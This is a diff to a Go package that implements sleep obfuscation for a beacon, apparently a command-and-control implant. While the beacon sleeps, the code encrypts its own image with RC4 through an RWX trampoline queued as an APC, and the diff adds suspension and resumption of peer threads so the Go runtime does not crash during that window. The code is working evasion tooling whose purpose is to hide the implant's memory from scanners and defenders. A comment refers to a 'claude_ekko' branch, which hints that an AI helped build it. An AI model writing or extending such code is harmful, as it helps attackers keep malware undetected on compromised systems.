@@ -1,33 +1,43 @@
 // Package apc implements sleep obfuscation via a QueueUserAPC-driven
-// encrypt/sleep/decrypt sequence running on the beacon's own thread.
+// encrypt/sleep/decrypt sequence running on the beacon's own thread,
+// with a minimal peer-thread suspension pass around it to prevent Go
+// runtime threads from faulting on the encrypted image.
 //
 // Design summary
 //
-// This replaces the older Ekko-based sleep obfuscation, which is
-// fundamentally incompatible with Go's runtime (see the claude_ekko
-// branch and the postmortem in that commit history). The design here
-// avoids every mechanism that caused Ekko to fail:
+// This replaces the older Ekko-based sleep obfuscation, which was
+// fundamentally incompatible with Go's runtime. See the claude_ekko
+// branch and the postmortem in that commit history for the details.
 //
-//   - No peer-thread enumeration or suspension: SuspendThread races
-//     with Go's async preemption and can deadlock on ntdll/loader locks.
-//   - No Windows thread-pool timer callbacks: the NtContinue-hijack of
-//     pool workers is fragile even in single-cycle use.
-//   - No GetThreadContext, ResumeThread, or Toolhelp snapshots: none of
-//     the syscalls that hung in the Ekko debugging campaign are touched.
+// The core encrypt-sleep-decrypt cycle runs from a hand-written amd64
+// trampoline placed in a VirtualAlloc'd RWX region OUTSIDE the process
+// image. Because the trampoline sits in a separate allocation and only
+// calls into ntdll/kernel32/advapi32 (never back into the encrypted Go
+// .text), it runs cleanly through the encrypted window on the same
+// thread that queued it as an APC.
 //
-// Instead we allocate a small RWX region OUTSIDE the process image and
-// drop a hand-written amd64 trampoline into it. That trampoline, when
-// invoked as a QueueUserAPC callback with a pointer to an apcArgs
-// struct, calls VirtualProtect / SystemFunction032 (RC4) /
-// NtDelayExecution / SystemFunction032 / VirtualProtect via function-
-// pointer indirect calls. Because the trampoline sits in a separate
-// allocation and only calls into ntdll/kernel32/advapi32 (never back
-// into the encrypted Go .text), it runs cleanly through the encrypted
-// window on the same thread.
+// BUT: with the image un-executable, any OTHER Go M (sysmon,
+// netpoller, GC worker, timer callback) that happens to fetch an
+// instruction from .text during the encrypted window will AV and take
+// the process down. That is the crash we saw on the first attempt at
+// this design without any peer-thread management.
 //
-// The caller enters the alertable wait via NtWaitForSingleObjectEx; the
-// APC dispatcher runs the trampoline to completion; the wait returns
-// STATUS_USER_APC; we clean up. That's the entire mechanism.
+// Fix: before entering the alertable wait, snapshot threads and
+// SuspendThread every image-based peer, then briefly delay to let the
+// kernel commit the suspensions before the trampoline touches memory.
+// After the wait returns, ResumeThread each peer (draining any
+// accumulated suspend count from Go's own async-preemption).
+//
+// We deliberately do NOT do the things that made Ekko fragile:
+//   - No CreateTimerQueue / NtContinue ROP hijack — everything runs
+//     as a single APC on our own thread.
+//   - No GetThreadContext after SuspendThread — that call has no
+//     timeout and hung whenever a target was suspended mid-kernel-
+//     transition. We replace it with a fixed short NtDelayExecution.
+//   - No repeated Ekko-style syscall churn per peer — just one
+//     SuspendThread and one ResumeThread(-drain) each, per cycle.
+//
+// See the claude_ekko postmortem for why each of the above matters.
 package apc
 
 import (
@@ -49,6 +59,28 @@ const (
 	memCommit  uintptr = 0x1000
 	memReserve uintptr = 0x2000
 	memRelease uintptr = 0x8000
+
+	// NtQueryInformationThread information class for the thread's
+	// user-mode start address (used to filter peer threads to only those
+	// that started inside our image — i.e. Go runtime Ms, not thread-pool
+	// workers or third-party threads).
+	threadQuerySetWin32StartAddress uintptr = 0x9
+
+	// Milliseconds to sleep between the suspend pass and the APC.
+	// SuspendThread is asynchronous; the kernel needs a moment to commit
+	// each suspension. GetThreadContext would block until commit but has
+	// no timeout — we use a fixed short delay instead.
+	commitDelayMs int64 = 5
+
+	// ResumeThread drain cap: no thread should legitimately reach 32
+	// stacked suspensions; this is a runaway backstop.
+	maxResumeDrain = 32
+
+	// DWORD (uint32) representation of -1, cast to uintptr. SuspendThread
+	// and ResumeThread return DWORD; on failure they return (DWORD)-1
+	// which zero-extends to 0x00000000FFFFFFFF in a 64-bit register, NOT
+	// 0xFFFFFFFFFFFFFFFF.
+	dwordMinusOne uintptr = 0xFFFFFFFF
 )
 
 var (
@@ -58,10 +90,13 @@ var (
 	procVirtualFree      = kernel32.NewProc("VirtualFree")
 	procVirtualProtect   = kernel32.NewProc("VirtualProtect")
 	procQueueUserAPC     = kernel32.NewProc("QueueUserAPC")
+	procSuspendThread    = kernel32.NewProc("SuspendThread")
+	procResumeThread     = kernel32.NewProc("ResumeThread")
 
-	ntdll                       = syscall.NewLazyDLL("ntdll.dll")
-	procNtDelayExecution        = ntdll.NewProc("NtDelayExecution")
-	procNtWaitForSingleObjectEx = ntdll.NewProc("NtWaitForSingleObjectEx")
+	ntdll                        = syscall.NewLazyDLL("ntdll.dll")
+	procNtDelayExecution         = ntdll.NewProc("NtDelayExecution")
+	procNtWaitForSingleObjectEx  = ntdll.NewProc("NtWaitForSingleObjectEx")
+	procNtQueryInformationThread = ntdll.NewProc("NtQueryInformationThread")
 
 	advapi32              = syscall.NewLazyDLL("Advapi32.dll")
 	procSystemFunction032 = advapi32.NewProc("SystemFunction032")
@@ -222,6 +257,92 @@ func mustOffset(name string, got, want uintptr) {
 	}
 }
 
+// suspendImagePeers enumerates every thread in the current process whose
+// user-mode start address falls inside our image (i.e. Go runtime Ms —
+// sysmon, netpoller, GC workers, other beacon goroutines' Ms), skips the
+// calling thread, and calls SuspendThread on the rest. Returns the list
+// of TIDs actually suspended so they can be resumed one-for-one later.
+//
+// We DO NOT call GetThreadContext after SuspendThread — that syscall
+// blocks until the kernel commits the suspension and has no timeout,
+// which was the source of one of the Ekko-era hangs. Instead, callers
+// should NtDelayExecution briefly after this returns to let the
+// suspensions commit before touching memory the peers may be reading.
+func suspendImagePeers(currentTID uint32, imageBase, imageEnd uintptr) ([]uint32, error) {
+	hSnapshot, err := windows.CreateToolhelp32Snapshot(windows.TH32CS_SNAPTHREAD, 0)
+	if err != nil {
+		return nil, err
+	}
+	defer windows.CloseHandle(hSnapshot)
+
+	var te windows.ThreadEntry32
+	te.Size = uint32(unsafe.Sizeof(te))
+	if err := windows.Thread32First(hSnapshot, &te); err != nil {
+		return nil, err
+	}
+
+	currentPID := uint32(windows.GetCurrentProcessId())
+	suspended := make([]uint32, 0, 32)
+
+	for {
+		if te.OwnerProcessID == currentPID && te.ThreadID != currentTID {
+			hThread, openErr := windows.OpenThread(
+				windows.THREAD_SUSPEND_RESUME|windows.THREAD_QUERY_INFORMATION,
+				false, te.ThreadID,
+			)
+			if openErr == nil {
+				var startAddr, retLen uintptr
+				procNtQueryInformationThread.Call(
+					uintptr(hThread),
+					threadQuerySetWin32StartAddress,
+					uintptr(unsafe.Pointer(&startAddr)),
+					unsafe.Sizeof(startAddr),
+					uintptr(unsafe.Pointer(&retLen)),
+				)
+				if startAddr >= imageBase && startAddr < imageEnd {
+					r, _, _ := procSuspendThread.Call(uintptr(hThread))
+					if r != dwordMinusOne {
+						suspended = append(suspended, te.ThreadID)
+					}
+				}
+				windows.CloseHandle(hThread)
+			}
+		}
+		if err := windows.Thread32Next(hSnapshot, &te); err != nil {
+			break
+		}
+	}
+	return suspended, nil
+}
+
+// resumePeers iterates the TID list produced by suspendImagePeers and
+// resumes each one, DRAINING the suspend count with a bounded loop.
+// Go's sysmon can independently suspend the same M as part of async
+// preemption; if it does so while our own SuspendThread is in effect,
+// the counter can exceed 1 and a single ResumeThread call would leave
+// the thread stuck. Draining until ResumeThread returns 1 (was last
+// suspension) or 0 (wasn't suspended) fixes that.
+//
+// A failure to open a TID handle is intentionally swallowed — it means
+// the thread has exited between the suspend pass and now, so there is
+// nothing to resume. We must keep going through the rest of the list
+// unconditionally.
+func resumePeers(tids []uint32) {
+	for _, tid := range tids {
+		hThread, err := windows.OpenThread(windows.THREAD_SUSPEND_RESUME, false, tid)
+		if err != nil {
+			continue
+		}
+		for i := 0; i < maxResumeDrain; i++ {
+			r, _, _ := procResumeThread.Call(uintptr(hThread))
+			if r == 0 || r == 1 || r == dwordMinusOne {
+				break
+			}
+		}
+		windows.CloseHandle(hThread)
+	}
+}
+
 // Sleep obfuscates the current process image for sleepMs milliseconds.
 //
 // See the package-level comment for the overall design. The important
@@ -309,16 +430,42 @@ func Sleep(sleepMs uint64) error {
 	// Real handle to self. The pseudo-handle from GetCurrentThread works
 	// with QueueUserAPC in practice but is not documented as guaranteed;
 	// take the safe path.
+	currentTID := windows.GetCurrentThreadId()
 	hSelf, err := windows.OpenThread(
 		windows.THREAD_SET_CONTEXT|windows.THREAD_QUERY_INFORMATION,
 		false,
-		windows.GetCurrentThreadId(),
+		currentTID,
 	)
 	if err != nil {
 		errorsTotal.Add(1)
 		return err
 	}
 	defer windows.CloseHandle(hSelf)
+
+	// -------- SUSPEND PEER GO Ms --------
+	// The trampoline is about to strip the image's execute bit and encrypt
+	// it. Any other thread that fetches an instruction from .text during
+	// that window (Go's sysmon fires every ~20 ms; netpoller and GC
+	// workers wake on demand) would AV and take the whole process down.
+	// Freeze them for the duration of the cycle. All Go heap allocations
+	// above this line have already run; below it we only make Windows
+	// syscalls, so a suspended peer can't be holding a Go runtime lock
+	// that we then wait on.
+	imageEnd := imageBase + imageSize
+	suspendedTIDs, err := suspendImagePeers(currentTID, imageBase, imageEnd)
+	if err != nil {
+		errorsTotal.Add(1)
+		return err
+	}
+
+	// SuspendThread is asynchronous — give the kernel a moment to commit
+	// each suspension before we start mutating the image. Without this,
+	// a peer could still be executing an in-flight instruction when we
+	// begin the RC4 pass. This is the deliberate replacement for the
+	// GetThreadContext-after-SuspendThread trick, which had no timeout
+	// and hung in the Ekko debugging campaign.
+	commitDelay := -commitDelayMs * 10_000
+	procNtDelayExecution.Call(0, uintptr(unsafe.Pointer(&commitDelay)))
 
 	// Queue the APC. It will not be delivered until this thread enters an
 	// alertable wait — which happens on the very next line.
@@ -328,6 +475,10 @@ func Sleep(sleepMs uint64) error {
 		uintptr(unsafe.Pointer(args)),
 	)
 	if ret == 0 {
+		// Never entered the encrypted window — safe to resume immediately
+		// and bail. Failing to resume peers here would leave the process
+		// deadlocked with no way out.
+		resumePeers(suspendedTIDs)
 		errorsTotal.Add(1)
 		return errors.New("apc: QueueUserAPC failed")
 	}
@@ -347,6 +498,10 @@ func Sleep(sleepMs uint64) error {
 		1, // Alertable = TRUE
 		0, // Timeout = NULL (INFINITE)
 	)
+
+	// -------- RESUME PEER GO Ms --------
+	// Image is decrypted and executable again; peers are safe to run.
+	resumePeers(suspendedTIDs)
 
 	// Keep the buffers referenced through the unmanaged execution above.
 	// Go's escape analysis handles &args and &keyBuf, but an explicit
